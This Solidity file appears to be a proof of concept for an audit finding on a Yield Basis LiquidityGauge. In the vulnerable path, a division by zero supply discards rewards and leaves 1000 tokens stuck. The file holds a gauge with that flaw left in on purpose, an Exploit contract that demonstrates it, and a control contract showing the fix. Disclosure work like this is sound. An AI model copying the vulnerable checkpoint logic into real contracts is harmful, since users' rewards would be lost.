// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    Yield Basis LiquidityGauge — rewards die when totalSupply is 0 (#61923)

    SYNTHETIC, cheatcode-free. Verbatim integral from LiquidityGauge._checkpoint
    at yb-core 3352c612:

        integral.v += unsafe_div(1e36 * dt, totalSupply)

    Vyper unsafe_div returns 0 when totalSupply is 0, and the code still
    advances `t` and vests d_reward. The reward is marked processed and is
    credited to nobody. A later depositor in the same block cannot claim it.
    The window is one second (integral.t = block.timestamp - 1). No warp
    inside run(). The fix does not advance time or vest while supply is 0,
    so the same-block deposit still receives the reward.
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract LiquidityGauge {
    struct Integral {
        uint256 v;
        uint256 t;
    }

    Token public immutable rewardToken;
    bool public immutable keepEmptyTime;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public rewardTotal;
    uint256 public processed;
    uint256 public rewardLast;
    uint256 public rewardFinish;
    Integral public integralInv;
    Integral public rateIntegral;
    uint256 public invAtToken;
    mapping(address => Integral) public userIntegral;
    mapping(address => uint256) public rateAtUser;
    mapping(address => uint256) public claimed;

    constructor(Token t, bool vulnerable) {
        rewardToken = t;
        keepEmptyTime = vulnerable;
    }

    function _unsafeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        if (b == 0) return 0;
        return a / b;
    }

    function _vest() internal returns (uint256 d) {
        if (rewardFinish > rewardLast && processed < rewardTotal) {
            d = (rewardTotal - processed) * (block.timestamp - rewardLast) / (rewardFinish - rewardLast);
            if (processed + d > rewardTotal) d = rewardTotal - processed;
            processed += d;
        }
    }

    function _checkpoint(address user, uint256 dReward) internal {
        if (block.timestamp > integralInv.t) {
            uint256 elapsed = block.timestamp - integralInv.t;
            uint256 supply = totalSupply;
            if (!keepEmptyTime && supply == 0) {
                // fixed: do not consume the empty interval
            } else {
                // @> VULN: unsafe_div by totalSupply 0 returns 0 and this interval is discarded
                uint256 invDelta = _unsafeDiv(1e36 * elapsed, supply);
                integralInv.v += invDelta;
                integralInv.t = block.timestamp;
            }
        }
        if (block.timestamp > rateIntegral.t) {
            uint256 dt = block.timestamp - rateIntegral.t;
            uint256 grown = integralInv.v - invAtToken;
            if (dt > 0 && (keepEmptyTime || totalSupply > 0)) {
                rateIntegral.v += (grown * dReward) / dt;
                rateIntegral.t = block.timestamp;
                invAtToken = integralInv.v;
            }
        }
        if (user != address(0) && block.timestamp > userIntegral[user].t) {
            uint256 earned = (rateIntegral.v - rateAtUser[user]) * balanceOf[user] / 1e36;
            userIntegral[user].v += earned;
            userIntegral[user].t = block.timestamp;
            rateAtUser[user] = rateIntegral.v;
        }
    }

    function fund(uint256 amount) external {
        require(block.timestamp >= 1, "ts");
        require(rewardToken.transferFrom(msg.sender, address(this), amount), "fund");
        rewardTotal += amount;
        rewardLast = block.timestamp - 1;
        rewardFinish = block.timestamp;
        integralInv.t = block.timestamp - 1;
        rateIntegral.t = block.timestamp - 1;
    }

    function poke() external {
        uint256 d = _vest();
        _checkpoint(address(0), d);
    }

    function deposit(address user, uint256 shares) external {
        totalSupply += shares;
        balanceOf[user] += shares;
    }

    function claim(address user) external returns (uint256 amt) {
        uint256 d = _vest();
        _checkpoint(user, d);
        amt = userIntegral[user].v - claimed[user];
        claimed[user] = userIntegral[user].v;
        if (amt > 0) {
            require(rewardToken.transfer(user, amt), "pay");
        }
    }
}

contract Exploit {
    Token public token; // CREATE 1
    LiquidityGauge public gauge; // CREATE 2
    address public constant STAKER = 0x6666666666666666666666666666666666666666;

    uint256 public claimedAmt;
    uint256 public stuck;
    uint256 public constant REWARD = 1000 ether;

    constructor() {
        token = new Token();
        gauge = new LiquidityGauge(token, true);
    }

    function run() external {
        token.mint(address(this), REWARD);
        token.approve(address(gauge), REWARD);
        gauge.fund(REWARD);
        gauge.poke();
        gauge.deposit(STAKER, 1 ether);
        claimedAmt = gauge.claim(STAKER);
        stuck = token.balanceOf(address(gauge));
        require(claimedAmt == 0, "nothing credited");
        require(stuck == REWARD, "1000 stuck");
        require(token.balanceOf(STAKER) == 0, "staker got 0");
    }
}

contract ControlExploit {
    Token public token;
    LiquidityGauge public gauge;
    address public constant STAKER = 0x6666666666666666666666666666666666666666;

    uint256 public claimedAmt;
    uint256 public stuck;
    uint256 public constant REWARD = 1000 ether;

    constructor() {
        token = new Token();
        gauge = new LiquidityGauge(token, false);
    }

    function run() external {
        gauge.deposit(STAKER, 1 ether);
        token.mint(address(this), REWARD);
        token.approve(address(gauge), REWARD);
        gauge.fund(REWARD);
        claimedAmt = gauge.claim(STAKER);
        stuck = token.balanceOf(address(gauge));
        require(claimedAmt == REWARD, "staker got 1000");
        require(stuck == 0, "nothing stuck");
        require(token.balanceOf(STAKER) == REWARD, "paid");
    }
}
